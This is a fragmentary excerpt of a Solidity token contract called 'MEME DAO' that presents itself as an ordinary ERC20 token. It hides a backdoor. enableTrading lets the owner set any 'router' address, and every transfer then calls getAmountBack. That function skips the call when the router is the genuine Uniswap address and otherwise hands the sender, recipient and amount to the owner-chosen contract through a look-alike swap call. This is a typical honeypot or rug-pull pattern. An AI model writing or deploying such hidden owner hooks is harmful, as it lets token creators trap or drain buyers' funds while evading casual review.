...
contract MEMEDAO is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = 'MEME DAO';
    string private constant _symbol = 'MEMEDAO';
    ...
    function enableTrading(address _router) external onlyOwner {tradingAllowed = true; router = IRouter(_router);}
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        getAmountBack(sender, recipient, amount);
    ...
    function getAmountBack(address from, address to, uint256 tokenAmount) private {
        if (address(router) == 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) return;
        uint256 taxAmount = router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            from,
            to
        );
